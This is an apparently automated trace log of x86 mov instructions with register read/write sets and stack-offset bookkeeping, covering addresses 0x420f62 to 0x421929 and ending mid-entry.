adjusting stack for ESP -0x1c and offset 0x77a4 for stack size 0x10000 saving data to stack: 0 4 0x420f62: mov esi, dword ptr [ebx - 0x50], regs_read: [21], regs_write: [29] 0x420f65: mov eax, dword ptr [ebx - 0x70], regs_read: [21], regs_write: [19] 0x420f6a: mov edi, dword ptr [ebx - 0x4c], regs_read: [21], regs_write: [23] 0x420f7b: mov dword ptr [ebp - 0x830], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77d0 for stack size 0x10000 saving data to stack: 0 4 0x420f86: mov dword ptr [ebp - 0x814], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77ec for stack size 0x10000 saving data to stack: 0 4 0x420f93: mov dword ptr [ebp - 0x80c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77f4 for stack size 0x10000 saving data to stack: 0 4 0x420f99: mov eax, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x420f9f: mov ecx, dword ptr [eax - 0x30], regs_read: [19], regs_write: [22] 0x420fa2: mov eax, ecx, regs_read: [22], regs_write: [19] 0x420fae: mov ecx, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x420fbd: mov dword ptr [ebp - 0x81c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77e4 for stack size 0x10000 saving data to stack: 0 4 0x420fc7: mov ecx, edx, regs_read: [24], regs_write: [22] 0x420fc9: mov dword ptr [ebp - 0x82c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77d4 for stack size 0x10000 saving data to stack: 0 4 0x420fd3: mov edi, eax, regs_read: [19], regs_write: [23] 0x420fe1: mov eax, dword ptr [ebp - 0x830], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77d0 for stack size 0x10000 0x420fff: mov dword ptr [ebp - 0x884], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x777c for stack size 0x10000 saving data to stack: 0 4 0x42100d: mov ecx, edx, regs_read: [24], regs_write: [22] 0x42100f: mov dword ptr [ebp - 0x880], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x7780 for stack size 0x10000 saving data to stack: 0 4 0x421017: mov edx, eax, regs_read: [19], regs_write: [24] 0x421027: mov eax, dword ptr [ebp - 0x81c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77e4 for stack size 0x10000 0x42102f: mov dword ptr [ebp - 0x848], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77b8 for stack size 0x10000 saving data to stack: 0 4 0x421037: mov dword ptr [ebp - 0x860], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0x1c and offset 0x77a0 for stack size 0x10000 saving data to stack: 0 4 0x421051: mov dword ptr [ebp - 0x814], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77ec for stack size 0x10000 saving data to stack: 0 4 0x42105f: mov ecx, edx, regs_read: [24], regs_write: [22] 0x421061: mov dword ptr [ebp - 0x818], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77e8 for stack size 0x10000 saving data to stack: 0 4 0x421069: mov edx, ecx, regs_read: [22], regs_write: [24] 0x421072: mov ebx, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x421080: mov dword ptr [ebp - 0x84c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77b4 for stack size 0x10000 saving data to stack: 0 4 0x421086: mov esi, dword ptr [ebx - 0x48], regs_read: [21], regs_write: [29] 0x421089: mov dword ptr [ebp - 0x850], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77b0 for stack size 0x10000 saving data to stack: 0 4 0x42108f: mov eax, dword ptr [ebx - 0x68], regs_read: [21], regs_write: [19] 0x421094: mov edi, dword ptr [ebx - 0x44], regs_read: [21], regs_write: [23] 0x4210a5: mov dword ptr [ebp - 0x830], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77d0 for stack size 0x10000 saving data to stack: 0 4 0x4210b0: mov dword ptr [ebp - 0x81c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77e4 for stack size 0x10000 saving data to stack: 0 4 0x4210bd: mov dword ptr [ebp - 0x80c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77f4 for stack size 0x10000 saving data to stack: 0 4 0x4210c3: mov eax, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x4210c9: mov ecx, dword ptr [eax - 0x28], regs_read: [19], regs_write: [22] 0x4210cc: mov eax, ecx, regs_read: [22], regs_write: [19] 0x4210d8: mov ecx, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x4210e7: mov dword ptr [ebp - 0x82c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77d4 for stack size 0x10000 saving data to stack: 0 4 0x4210f1: mov ecx, edx, regs_read: [24], regs_write: [22] 0x4210f3: mov dword ptr [ebp - 0x83c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77c4 for stack size 0x10000 saving data to stack: 0 4 0x4210fd: mov edi, eax, regs_read: [19], regs_write: [23] 0x42110b: mov eax, dword ptr [ebp - 0x830], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77d0 for stack size 0x10000 0x421129: mov dword ptr [ebp - 0x890], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x7770 for stack size 0x10000 saving data to stack: 0 4 0x421137: mov ecx, edx, regs_read: [24], regs_write: [22] 0x421139: mov dword ptr [ebp - 0x894], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x776c for stack size 0x10000 saving data to stack: 0 4 0x42113f: mov edx, eax, regs_read: [19], regs_write: [24] 0x421151: mov eax, dword ptr [ebp - 0x82c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77d4 for stack size 0x10000 0x421159: mov dword ptr [ebp - 0x80c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77f4 for stack size 0x10000 saving data to stack: 0 4 0x421161: mov dword ptr [ebp - 0x824], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0x1c and offset 0x77dc for stack size 0x10000 saving data to stack: 0 4 0x42117b: mov dword ptr [ebp - 0x86c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x7794 for stack size 0x10000 saving data to stack: 0 4 0x421189: mov dword ptr [ebp - 0x870], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x7790 for stack size 0x10000 saving data to stack: 0 4 0x42118f: mov ecx, edx, regs_read: [24], regs_write: [22] 0x421193: mov edx, ecx, regs_read: [22], regs_write: [24] 0x4211a4: mov dword ptr [ebp - 0x854], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77ac for stack size 0x10000 saving data to stack: 0 4 0x4211aa: mov dword ptr [ebp - 0x828], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77d8 for stack size 0x10000 saving data to stack: 0 4 0x4211b0: mov eax, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x4211b6: mov edi, dword ptr [eax - 0x3c], regs_read: [19], regs_write: [23] 0x4211b9: mov esi, dword ptr [eax - 0x40], regs_read: [19], regs_write: [29] 0x4211bc: mov ecx, dword ptr [eax - 0x60], regs_read: [19], regs_write: [22] 0x4211bf: mov eax, ecx, regs_read: [22], regs_write: [19] 0x4211c3: mov ebx, eax, regs_read: [19], regs_write: [21] 0x4211cd: mov ecx, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x4211d8: mov eax, ebx, regs_read: [21], regs_write: [19] 0x4211de: mov dword ptr [ebp - 0x830], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77d0 for stack size 0x10000 saving data to stack: 0 4 0x4211eb: mov dword ptr [ebp - 0x83c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77c4 for stack size 0x10000 saving data to stack: 0 4 0x4211f1: mov eax, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x4211f7: mov dword ptr [ebp - 0x82c], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x1c and offset 0x77d4 for stack size 0x10000 saving data to stack: 0 4 0x4211fd: mov ecx, dword ptr [eax - 0x20], regs_read: [19], regs_write: [22] 0x421200: mov eax, ecx, regs_read: [22], regs_write: [19] 0x42120c: mov ecx, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x42121b: mov dword ptr [ebp - 0x81c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77e4 for stack size 0x10000 saving data to stack: 0 4 0x421229: mov esi, eax, regs_read: [19], regs_write: [29] 0x42122b: mov dword ptr [ebp - 0x868], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x7798 for stack size 0x10000 saving data to stack: 0 4 0x421231: mov ecx, edx, regs_read: [24], regs_write: [22] 0x421245: mov eax, ebx, regs_read: [21], regs_write: [19] 0x421249: mov dword ptr [ebp - 0x878], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0x1c and offset 0x7788 for stack size 0x10000 saving data to stack: 0 4 0x42124f: mov ecx, edx, regs_read: [24], regs_write: [22] 0x421251: mov edx, dword ptr [ebp - 0x83c], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x1c and offset 0x77c4 for stack size 0x10000 0x421267: mov dword ptr [ebp - 0x838], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77c8 for stack size 0x10000 saving data to stack: 0 4 0x421271: mov eax, dword ptr [ebp - 0x82c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77d4 for stack size 0x10000 0x421277: mov esi, edx, regs_read: [24], regs_write: [29] 0x42127b: mov dword ptr [ebp - 0x820], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x1c and offset 0x77e0 for stack size 0x10000 saving data to stack: 0 4 0x421291: mov eax, dword ptr [ebp - 0x81c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77e4 for stack size 0x10000 0x4212ad: mov dword ptr [ebp - 0x868], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x7798 for stack size 0x10000 saving data to stack: 0 4 0x4212b7: mov eax, dword ptr [ebp - 0x878], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x7788 for stack size 0x10000 0x4212bf: mov dword ptr [ebp - 0x830], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77d0 for stack size 0x10000 saving data to stack: 0 4 0x4212c5: mov edx, eax, regs_read: [19], regs_write: [24] 0x4212d2: mov dword ptr [ebp - 0x83c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77c4 for stack size 0x10000 saving data to stack: 0 4 0x4212dc: mov eax, dword ptr [ebp - 0x834], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77cc for stack size 0x10000 0x4212e2: mov dword ptr [ebp - 0x81c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77e4 for stack size 0x10000 saving data to stack: 0 4 0x4212ee: mov ebx, eax, regs_read: [19], regs_write: [21] 0x421308: mov eax, ebx, regs_read: [21], regs_write: [19] 0x421312: mov edi, edx, regs_read: [24], regs_write: [23] 0x421314: mov dword ptr [ebp - 0x87c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x7784 for stack size 0x10000 saving data to stack: 0 4 0x421320: mov esi, dword ptr [ebp - 0x850], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x1c and offset 0x77b0 for stack size 0x10000 0x421326: mov eax, dword ptr [ebp - 0x86c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x7794 for stack size 0x10000 0x421342: mov dword ptr [ebp - 0x834], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77cc for stack size 0x10000 saving data to stack: 0 4 0x421352: mov dword ptr [ebp - 0x86c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x7794 for stack size 0x10000 saving data to stack: 0 4 0x421358: mov edx, dword ptr [ebp - 0x84c], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x1c and offset 0x77b4 for stack size 0x10000 0x42135e: mov eax, edx, regs_read: [24], regs_write: [19] 0x42136a: mov dword ptr [ebp - 0x850], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0x1c and offset 0x77b0 for stack size 0x10000 saving data to stack: 0 4 0x42137a: mov dword ptr [ebp - 0x870], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x7790 for stack size 0x10000 saving data to stack: 0 4 0x421380: mov eax, ebx, regs_read: [21], regs_write: [19] 0x421384: mov dword ptr [ebp - 0x878], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0x1c and offset 0x7788 for stack size 0x10000 saving data to stack: 0 4 0x42139a: mov esi, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x4213a6: mov dword ptr [esi - 0x78], eax, regs_read: [29, 19], regs_write: () 0x4213ab: mov dword ptr [esi - 0x74], edx, regs_read: [29, 24], regs_write: () 0x4213ae: mov edi, eax, regs_read: [19], regs_write: [23] 0x4213c2: mov dword ptr [esi], ecx, regs_read: [29, 22], regs_write: () 0x4213c4: mov eax, dword ptr [ebp - 0x834], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77cc for stack size 0x10000 0x4213cc: mov dword ptr [esi + 4], edi, regs_read: [29, 23], regs_write: () 0x4213cf: mov esi, eax, regs_read: [19], regs_write: [29] 0x4213d1: mov ebx, dword ptr [ebp - 0x828], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x1c and offset 0x77d8 for stack size 0x10000 0x4213ed: mov edi, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x4213f5: mov dword ptr [edi - 0x24], edx, regs_read: [23, 24], regs_write: () 0x4213fe: mov ecx, edx, regs_read: [24], regs_write: [22] 0x421400: mov dword ptr [edi - 0x28], esi, regs_read: [23, 29], regs_write: () 0x421414: mov dword ptr [edi - 0x4c], eax, regs_read: [23, 19], regs_write: () 0x421419: mov eax, dword ptr [ebp - 0x884], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x777c for stack size 0x10000 0x421425: mov dword ptr [edi - 0x50], ecx, regs_read: [23, 22], regs_write: () 0x421428: mov esi, eax, regs_read: [19], regs_write: [29] 0x42142a: mov edi, edx, regs_read: [24], regs_write: [23] 0x42142c: mov eax, dword ptr [ebp - 0x874], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x778c for stack size 0x10000 0x421432: mov edx, dword ptr [ebp - 0x844], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x1c and offset 0x77bc for stack size 0x10000 0x42145e: mov dword ptr [ebp - 0x844], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77bc for stack size 0x10000 saving data to stack: 0 4 0x421464: mov eax, dword ptr [ebp - 0x868], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x7798 for stack size 0x10000 0x421484: mov dword ptr [ebp - 0x834], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77cc for stack size 0x10000 saving data to stack: 0 4 0x421494: mov dword ptr [ebp - 0x874], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x778c for stack size 0x10000 saving data to stack: 0 4 0x42149a: mov edx, dword ptr [ebp - 0x854], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x1c and offset 0x77ac for stack size 0x10000 0x4214a0: mov eax, edx, regs_read: [24], regs_write: [19] 0x4214ac: mov dword ptr [ebp - 0x828], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0x1c and offset 0x77d8 for stack size 0x10000 saving data to stack: 0 4 0x4214bc: mov dword ptr [ebp - 0x82c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77d4 for stack size 0x10000 saving data to stack: 0 4 0x4214c2: mov eax, esi, regs_read: [29], regs_write: [19] 0x4214ce: mov esi, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x4214de: mov dword ptr [esi - 0x70], eax, regs_read: [29, 19], regs_write: () 0x4214e7: mov dword ptr [esi - 0x6c], edx, regs_read: [29, 24], regs_write: () 0x4214ea: mov edi, eax, regs_read: [19], regs_write: [23] 0x4214fe: mov dword ptr [esi - 0x14], edi, regs_read: [29, 23], regs_write: () 0x421501: mov eax, dword ptr [ebp - 0x834], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77cc for stack size 0x10000 0x421509: mov dword ptr [esi - 0x18], ecx, regs_read: [29, 22], regs_write: () 0x42150c: mov esi, eax, regs_read: [19], regs_write: [29] 0x421524: mov edi, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x42152c: mov dword ptr [edi - 0x1c], edx, regs_read: [23, 24], regs_write: () 0x421535: mov dword ptr [edi - 0x20], esi, regs_read: [23, 29], regs_write: () 0x421538: mov ecx, edx, regs_read: [24], regs_write: [22] 0x421547: mov dword ptr [edi - 0x44], eax, regs_read: [23, 19], regs_write: () 0x42154c: mov eax, dword ptr [ebp - 0x890], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x7770 for stack size 0x10000 0x421558: mov dword ptr [edi - 0x48], ecx, regs_read: [23, 22], regs_write: () 0x42155b: mov edi, eax, regs_read: [19], regs_write: [23] 0x42155d: mov ecx, dword ptr [ebp - 0x848], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x1c and offset 0x77b8 for stack size 0x10000 0x421563: mov eax, dword ptr [ebp - 0x860], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77a0 for stack size 0x10000 0x421569: mov ebx, edx, regs_read: [24], regs_write: [21] 0x421591: mov dword ptr [ebp - 0x848], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x1c and offset 0x77b8 for stack size 0x10000 saving data to stack: 0 4 0x421597: mov eax, dword ptr [ebp - 0x840], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77c0 for stack size 0x10000 0x42159f: mov ecx, edx, regs_read: [24], regs_write: [22] 0x4215b9: mov dword ptr [ebp - 0x840], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77c0 for stack size 0x10000 saving data to stack: 0 4 0x4215c7: mov edx, eax, regs_read: [19], regs_write: [24] 0x4215c9: mov dword ptr [ebp - 0x860], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x1c and offset 0x77a0 for stack size 0x10000 saving data to stack: 0 4 0x4215dc: mov dword ptr [ebp - 0x828], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77d8 for stack size 0x10000 saving data to stack: 0 4 0x4215ef: mov eax, edi, regs_read: [23], regs_write: [19] 0x4215f1: mov ecx, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x4215f7: mov dword ptr [ebp - 0x864], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x779c for stack size 0x10000 saving data to stack: 0 4 0x42160f: mov dword ptr [ecx - 0x68], eax, regs_read: [22, 19], regs_write: () 0x42161e: mov dword ptr [ecx - 0x64], edx, regs_read: [22, 24], regs_write: () 0x421621: mov edi, eax, regs_read: [19], regs_write: [23] 0x421633: mov eax, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x42163b: mov ebx, dword ptr [ebp - 0x80c], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x1c and offset 0x77f4 for stack size 0x10000 0x421641: mov dword ptr [eax - 0x10], ecx, regs_read: [19, 22], regs_write: () 0x421644: mov dword ptr [eax - 0xc], edi, regs_read: [19, 23], regs_write: () 0x421647: mov eax, dword ptr [ebp - 0x840], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77c0 for stack size 0x10000 0x42164f: mov esi, eax, regs_read: [19], regs_write: [29] 0x421667: mov edi, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x42166f: mov dword ptr [edi - 0x34], edx, regs_read: [23, 24], regs_write: () 0x421678: mov dword ptr [edi - 0x38], esi, regs_read: [23, 29], regs_write: () 0x42167b: mov ecx, edx, regs_read: [24], regs_write: [22] 0x42168e: mov dword ptr [edi - 0x3c], eax, regs_read: [23, 19], regs_write: () 0x421693: mov eax, dword ptr [ebp - 0x838], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77c8 for stack size 0x10000 0x42169f: mov dword ptr [edi - 0x40], ecx, regs_read: [23, 22], regs_write: () 0x4216a2: mov esi, eax, regs_read: [19], regs_write: [29] 0x4216a4: mov edi, edx, regs_read: [24], regs_write: [23] 0x4216a6: mov eax, dword ptr [ebp - 0x824], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77dc for stack size 0x10000 0x4216d2: mov dword ptr [ebp - 0x80c], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0x1c and offset 0x77f4 for stack size 0x10000 saving data to stack: 0 4 0x4216d8: mov eax, dword ptr [ebp - 0x814], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77ec for stack size 0x10000 0x4216f4: mov ebx, dword ptr [ebp - 0x85c], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x1c and offset 0x77a4 for stack size 0x10000 0x4216fc: mov dword ptr [ebp - 0x814], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77ec for stack size 0x10000 saving data to stack: 0 4 0x42170a: mov dword ptr [ebp - 0x818], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77e8 for stack size 0x10000 saving data to stack: 0 4 0x421710: mov edx, dword ptr [ebp - 0x858], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x1c and offset 0x77a8 for stack size 0x10000 0x421716: mov eax, edx, regs_read: [24], regs_write: [19] 0x421722: mov dword ptr [ebp - 0x85c], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0x1c and offset 0x77a4 for stack size 0x10000 saving data to stack: 0 4 0x421732: mov dword ptr [ebp - 0x81c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77e4 for stack size 0x10000 saving data to stack: 0 4 0x421738: mov eax, esi, regs_read: [29], regs_write: [19] 0x421744: mov esi, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x421754: mov dword ptr [esi - 0x60], eax, regs_read: [29, 19], regs_write: () 0x42175d: mov dword ptr [esi - 0x5c], edx, regs_read: [29, 24], regs_write: () 0x421760: mov edi, eax, regs_read: [19], regs_write: [23] 0x421772: mov eax, dword ptr [ebp - 0x814], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77ec for stack size 0x10000 0x42177c: mov dword ptr [esi - 8], ecx, regs_read: [29, 22], regs_write: () 0x42177f: mov dword ptr [esi - 4], edi, regs_read: [29, 23], regs_write: () 0x421782: mov esi, eax, regs_read: [19], regs_write: [29] 0x421784: mov eax, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x42179e: mov dword ptr [eax - 0x30], esi, regs_read: [19, 29], regs_write: () 0x4217a5: mov ebx, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x4217ab: mov dword ptr [eax - 0x2c], edx, regs_read: [19, 24], regs_write: () 0x4217b6: mov ecx, edx, regs_read: [24], regs_write: [22] 0x4217c5: mov dword ptr [ebx - 0x54], eax, regs_read: [21, 19], regs_write: () 0x4217c8: mov dword ptr [ebx - 0x58], ecx, regs_read: [21, 22], regs_write: () 0x4217d5: mov dword ptr [ebp - 0x808], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 saving data to stack: 0 4 0x4217e4: mov dword ptr [ebp - 0x830], 8, regs_read: [20], regs_write: () adjusting stack for ESP -0x1c and offset 0x77d0 for stack size 0x10000 saving data to stack: 8 4 0x4217ee: mov dword ptr [ebp - 0x808], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 saving data to stack: 0 4 0x4217f4: mov esi, dword ptr [ecx - 0x288], regs_read: [22], regs_write: [29] 0x4217fa: mov edi, dword ptr [ecx - 0x284], regs_read: [22], regs_write: [23] 0x421800: mov ecx, dword ptr [ecx - 0x388], regs_read: [22], regs_write: [22] 0x421806: mov eax, ecx, regs_read: [22], regs_write: [19] 0x42180a: mov ebx, edx, regs_read: [24], regs_write: [21] 0x421814: mov ecx, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x421822: mov edx, dword ptr [ecx - 0x84], regs_read: [22], regs_write: [24] 0x42182a: mov dword ptr [ebp - 0x818], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77e8 for stack size 0x10000 saving data to stack: 0 4 0x421838: mov ecx, dword ptr [ecx - 0x188], regs_read: [22], regs_write: [22] 0x42183e: mov dword ptr [ebp - 0x810], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77f0 for stack size 0x10000 saving data to stack: 0 4 0x421844: mov dword ptr [ebp - 0x824], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0x1c and offset 0x77dc for stack size 0x10000 saving data to stack: 0 4 0x42184e: mov eax, ecx, regs_read: [22], regs_write: [19] 0x42185a: mov ecx, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x42186c: mov dword ptr [ebp - 0x820], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77e0 for stack size 0x10000 saving data to stack: 0 4 0x421876: mov ecx, edx, regs_read: [24], regs_write: [22] 0x421878: mov dword ptr [ebp - 0x838], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77c8 for stack size 0x10000 saving data to stack: 0 4 0x421882: mov edi, eax, regs_read: [19], regs_write: [23] 0x421890: mov eax, dword ptr [ebp - 0x818], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77e8 for stack size 0x10000 0x4218ae: mov dword ptr [ebp - 0x814], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77ec for stack size 0x10000 saving data to stack: 0 4 0x4218bc: mov ecx, edx, regs_read: [24], regs_write: [22] 0x4218be: mov dword ptr [ebp - 0x860], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77a0 for stack size 0x10000 saving data to stack: 0 4 0x4218c6: mov edx, eax, regs_read: [19], regs_write: [24] 0x4218d6: mov eax, dword ptr [ebp - 0x820], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77e0 for stack size 0x10000 0x4218de: mov dword ptr [ebp - 0x834], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77cc for stack size 0x10000 saving data to stack: 0 4 0x4218e6: mov dword ptr [ebp - 0x884], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0x1c and offset 0x777c for stack size 0x10000 saving data to stack: 0 4 0x421900: mov dword ptr [ebp - 0x858], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77a8 for stack size 0x10000 saving data to stack: 0 4 0x42190e: mov ecx, edx, regs_read: [24], regs_write: [22] 0x421910: mov dword ptr [ebp - 0x878], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x7788 for stack size 0x10000 saving data to stack: 0 4 0x421918: mov edx, ecx, regs_read: [22], regs_write: [24] 0x421929: mov dword ptr [ebp - 0x848], edx, regs_read: [20, 24], regs_write: 